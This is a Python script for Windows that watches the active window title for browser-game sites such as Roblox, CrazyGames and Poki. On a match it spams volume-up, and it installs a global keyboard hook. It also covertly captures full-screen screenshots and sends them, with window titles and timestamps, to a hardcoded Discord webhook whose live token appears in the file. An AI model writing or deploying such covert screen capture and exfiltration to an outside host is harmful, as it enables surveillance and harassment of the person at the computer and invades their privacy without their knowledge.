import time
import threading
import win32gui
import pyautogui
import keyboard
import requests
import io
from datetime import datetime
from PIL import ImageGrab
import json

# ---------------- CONFIG ---------------- #
TARGET_KEYWORDS = [
    "crazygames",
    "roblox",
    "jeux gratuits",
    "joue maintenant", "poki"
]

SPAM_SPEED = 0.05       # seconds between volume presses
STABILITY_TIME = 0.3    # seconds the target must stay active to trigger spammer
PASSWORD = "stop123"    # Password to toggle tracking
TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking

# Discord Webhook Configuration
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"  # Replace with your webhook URL
SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)

# ---------------- GLOBALS ---------------- #
spamming = False
mute_done = False       # Ensure we mute only once when leaving
lock = threading.Lock() # Thread safety
tracking_enabled = True  # Master toggle for tracking
password_buffer = ""    # Stores typed characters for password detection
last_key_time = 0       # For clearing password buffer after timeout
detected_targets = set()  # Track already detected targets to avoid duplicate notifications

# ---------------- HELPERS ---------------- #
def title_matches_target(title: str) -> bool:
    title_lower = title.lower()
    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)

def get_matching_keyword(title: str) -> str:
    """Returns which keyword matched the title"""
    title_lower = title.lower()
    for keyword in TARGET_KEYWORDS:
        if keyword in title_lower:
            return keyword
    return ""

def take_screenshot():
    """Take a screenshot of the entire screen"""
    try:
        screenshot = ImageGrab.grab()
        return screenshot
    except Exception as e:
        print(f"[SCREENSHOT ERROR] {e}")
        return None

def send_discord_alert(title, keyword, screenshot=None):
    """Send alert to Discord webhook with optional screenshot"""
    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print("[DISCORD] No webhook URL configured")
        return False
    
    try:
        # Prepare the message
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        embed = {
            "title": "⚠️ Target Application Detected",
            "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`\n**Status:** {'SPAMMING VOLUME' if spamming else 'DETECTED'}",
            "color": 16711680,  # Red color
            "footer": {
                "text": "Tracker System"
            }
        }
        
        if screenshot and SEND_SCREENSHOTS:
            # Convert screenshot to bytes
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            
            # Prepare files for multipart upload
            files = {
                'file': ('screenshot.png', img_byte_arr, 'image/png')
            }
            
            # Prepare JSON payload for embed
            payload = {
                "embeds": [embed],
                "content": "📸 **Screenshot captured below:**"
            }
            
            # Send as multipart/form-data
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                files=files,
                data={'payload_json': json.dumps(payload)}
            )
        else:
            # Send without screenshot
            payload = {
                "embeds": [embed],
                "content": f"🚨 **Target detected:** {title}"
            }
            
            headers = {'Content-Type': 'application/json'}
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                json=payload,
                headers=headers
            )
        
        if response.status_code in [200, 204]:
            print(f"[DISCORD] Alert sent for: {title}")
            return True
        else:
            print(f"[DISCORD ERROR] Failed to send alert: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"[DISCORD ERROR] {e}")
        return False

def send_discord_status(status):
    """Send tracking status to Discord"""
    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        return False
    
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = 65280 if status == "ENABLED" else 16711680  # Green for enabled, red for disabled
        
        embed = {
            "title": f"🔄 Tracking {status}",
            "description": f"Tracking has been **{status.lower()}**\n**Time:** `{current_time}`",
            "color": color,
            "footer": {
                "text": "Tracker System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": f"📊 **Tracker Status Changed**"
        }
        
        headers = {'Content-Type': 'application/json'}
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
        
        if response.status_code not in [200, 204]:
            print(f"[DISCORD STATUS ERROR] {response.status_code} - {response.text}")
        return True
        
    except Exception as e:
        print(f"[DISCORD STATUS ERROR] {e}")
        return False

def toggle_tracking():
    """Toggle tracking on/off"""
    global tracking_enabled, password_buffer
    tracking_enabled = not tracking_enabled
    status = "ENABLED" if tracking_enabled else "DISABLED"
    print(f"[TRACKING] Tracking {status}")
    
    # Send Discord notification about status change
    send_discord_status(status)
    
    # Stop spammer if tracking is disabled and it's running
    if not tracking_enabled:
        global spamming, mute_done
        with lock:
            if spamming:
                spamming = False
                mute_done = True
                try:
                    pyautogui.press("volumemute")
                    print("[TRACKING] Spammer stopped and muted")
                except Exception as e:
                    print(f"[MUTE ERROR] {e}")
    
    password_buffer = ""  # Clear password buffer

def on_key_event(e):
    """Handle keyboard events for password detection"""
    global password_buffer, last_key_time
    
    # Ignore modifier keys and non-character keys
    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
        return
    
    current_time = time.time()
    
    # Clear buffer if too much time passed between keystrokes (2 seconds)
    if current_time - last_key_time > 2:
        password_buffer = ""
    
    last_key_time = current_time
    
    # Handle backspace
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'backspace':
            password_buffer = password_buffer[:-1]
        elif e.name == 'space':
            password_buffer += ' '
        elif len(e.name) == 1:  # Regular character
            password_buffer += e.name
        elif e.name == 'enter':  # Enter key submits password
            check_password()
            return
    
    # Check password continuously (without needing Enter)
    check_password()
    
    # Keep buffer from growing too large
    if len(password_buffer) > 20:
        password_buffer = password_buffer[-20:]

def check_password():
    """Check if password buffer contains the password"""
    global password_buffer
    if PASSWORD in password_buffer:
        toggle_tracking()
        password_buffer = ""  # Clear after successful match

def setup_keyboard_listener():
    """Setup global keyboard listeners"""
    # Hotkey to toggle tracking
    keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
    print(f"[HOTKEY] Press '{TOGGLE_HOTKEY}' to toggle tracking")
    print(f"[PASSWORD] Type '{PASSWORD}' to toggle tracking")
    
    # General key listener for password typing
    keyboard.hook(on_key_event, suppress=False)
    
    return keyboard

# ---------------- SPAMMER THREAD ---------------- #
def volume_spammer():
    global spamming
    while spamming:
        try:
            pyautogui.press("volumeup")
            time.sleep(SPAM_SPEED)
        except Exception as e:
            print(f"[SPAM ERROR] {e}")

# ---------------- MAIN LOOP ---------------- #
print("[SYSTEM] Monitoring started...")
print("[SYSTEM] Tracking is ENABLED by default")

# Test Discord connection
if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_URL_HERE":
    print(f"[DISCORD] Webhook configured - Screenshots: {SEND_SCREENSHOTS}")
    # Test webhook
    try:
        response = requests.get(DISCORD_WEBHOOK_URL)
        if response.status_code == 200:
            print("[DISCORD] Webhook URL is valid")
        else:
            print(f"[DISCORD WARNING] Webhook returned status: {response.status_code}")
    except:
        print("[DISCORD] Could not test webhook (might still work for posting)")
else:
    print("[DISCORD] No webhook configured - skipping Discord alerts")

# Setup keyboard listener
kb_listener = setup_keyboard_listener()

stable_on = 0.0
stable_off = 0.0

try:
    while True:
        # Only process tracking if enabled
        if tracking_enabled:
            try:
                hwnd = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(hwnd).strip()

                if not title:
                    time.sleep(0.05)
                    continue

                # Detect target
                detected = title_matches_target(title)

                # Update stability counters
                if detected:
                    stable_on += 0.1
                    stable_off = 0.0
                else:
                    stable_off += 0.1
                    stable_on = 0.0

                # Start spammer if stable ON
                if not spamming and stable_on >= STABILITY_TIME:
                    keyword = get_matching_keyword(title)
                    
                    with lock:
                        spamming = True
                        mute_done = False
                    
                    print(f"[ACTION] Target detected: '{title}' — starting spammer")
                    threading.Thread(target=volume_spammer, daemon=True).start()
                    
                    # Send Discord alert with screenshot
                    if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_URL_HERE":
                        # Use a unique identifier for this detection
                        detection_id = f"{title}_{keyword}_{int(time.time())}"
                        
                        if detection_id not in detected_targets:
                            detected_targets.add(detection_id)
                            
                            # Small delay before taking screenshot to ensure window is focused
                            time.sleep(SCREENSHOT_DELAY)
                            
                            # Take screenshot in main thread to avoid threading issues
                            screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                            
                            # Send alert in separate thread to not block
                            alert_thread = threading.Thread(
                                target=send_discord_alert,
                                args=(title, keyword, screenshot),
                                daemon=True
                            )
                            alert_thread.start()
                            
                            # Clean up detected targets after 5 minutes
                            threading.Timer(300, lambda: detected_targets.discard(detection_id)).start()

                # Stop spammer if stable OFF
                if spamming and stable_off >= STABILITY_TIME:
                    with lock:
                        spamming = False
                        if not mute_done:
                            try:
                                pyautogui.press("volumemute")
                                mute_done = True
                                print("[ACTION] Target lost — muted volume")
                            except Exception as e:
                                print(f"[MUTE ERROR] {e}")

            except Exception as e:
                print(f"[ERROR] {e}")
        
        # Sleep regardless of tracking state
        time.sleep(0.1)

except KeyboardInterrupt:
    print("[EXIT] Interrupted by user.")

finally:
    # Cleanup
    kb_listener.unhook_all()
    print("[SYSTEM] Keyboard listeners stopped")
    
    # Ensure spammer is stopped
    if spamming:
        spamming = False
        print("[SYSTEM] Spammer stopped")